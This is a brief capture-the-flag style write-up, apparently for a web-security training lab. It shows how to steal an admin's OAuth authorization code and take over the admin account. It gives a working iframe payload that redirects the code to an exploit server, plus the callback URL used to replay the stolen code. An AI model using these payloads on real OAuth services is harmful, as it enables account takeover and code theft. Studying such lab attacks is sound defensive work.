# Steal an authorization code associated with the admin user, then use it to access their account 

## CSRF payload
```
<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
```

## Your LAB_ID
0a25001703d7952382bc382a00cd004e.web-security-academy.net/

## Client-id
client_id=hvzf7wf1lr7d6aqc8g1wn

## Exploit server_ID
https://exploit-0abf0003030d954e82a437c9011c0062.exploit-server.net

## Final payload
```
<iframe src="https://oauth-0a25001703d7952382bc382a00cd004e.web-security-academy.net/auth?client_id=hvzf7wf1lr7d6aqc8g1wn&redirect_uri=https://exploit-0abf0003030d954e82a437c9011c0062.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
```

## Send to the admin, when admin clicks it, we get authorization code

![image](https://github.com/user-attachments/assets/9fb99eab-d13e-4f9d-997e-2aa79ba6ef15)

## Oauth_code payload

```
https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE
```

## Final Oauth_code paylod
```
https://0a25001703d7952382bc382a00cd004e.web-security-academy.net/oauth-callback?code=XI7nQtdvu94bgj-Z2uj-ktbGVbFBYKf1uI4GfGsbj0mx1
```
FInally got an admin access
